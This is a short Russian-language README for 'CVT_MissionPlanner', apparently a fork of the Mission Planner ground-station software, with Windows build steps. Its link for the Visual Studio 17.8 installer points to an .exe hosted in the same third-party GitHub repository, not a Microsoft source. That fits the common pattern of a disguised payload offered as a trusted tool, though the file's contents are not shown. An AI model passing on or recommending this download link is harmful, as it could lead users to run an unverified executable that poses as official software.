# CVT_MissionPlanner

Сайт: -

Скачать последнюю стабильную версию: -

## Как скомпилировать

### В Windows

#### 1. Установка ПО и настройка среды

##### Основные требования

Для Mission Planner необходимы: Visual Studio 2022 17.8

### Visual Studio Community

Для компиляции Mission Planner мы рекомендуем использовать Visual Studio версии 17.8. Вы можете скачать Visual Studio Community по ссылке [Visual Studio 17.8](https://raw.githubusercontent.com/D1ctarors/CVT_Mission_planner/main/visualstudiosetup_17.8.exe "visual_studio_setup_17.8.exe").

Файл конфигурации, который определяет компоненты, необходимые для разработки MissionPlanner. Как использовать:

1. Перейдите в раздел "Дополнительно" в установщике Visual Studio.
2. Выберите "Импортировать конфигурацию"
3. Используйте следующий файл: [vs2022.vsconfig](https://raw.githubusercontent.com/D1ctarors/CVT_Mission_planner/main/vs2022.vsconfig "vs2022.vsconfig").

Следуя этим шагам, у вас будут установлены необходимые компоненты и вы будете готовы к разработке Mission Planner.

#### 2. Получение кода

Если вы установите Visual Studio Community, вы сможете использовать Git из IDE.

Клонируйте `https://github.com/D1ctarors/CVT_Mission_planner.git`, чтобы получить полный код.

#### 3. Сборка

Чтобы собрать код:

- Откройте файл `MissionPlanner.sln` в Visual Studio
- В меню **Build** выберите **"Build MissionPlanner"**
